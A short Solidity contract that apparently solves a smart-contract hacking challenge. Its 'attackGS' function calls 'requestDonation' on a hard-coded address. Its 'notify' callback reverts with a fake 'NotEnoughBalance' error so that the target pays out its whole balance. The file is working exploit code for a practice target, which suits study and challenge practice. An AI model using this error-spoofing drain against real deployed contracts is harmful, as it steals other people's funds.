// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IGS {
    function requestDonation() external returns (bool);
}

contract Notifyable {
    address public gs = 0x4EFa9A4f7617D7331cDE4D04ee9990DCEE71d3Bd;
    uint public counter;

    error NotEnoughBalance();

    function attackGS() external {
        IGS(gs).requestDonation();
    }

    function notify(uint256 _amount) external {
        if (_amount == 10) {
            revert NotEnoughBalance();
        }
    }
}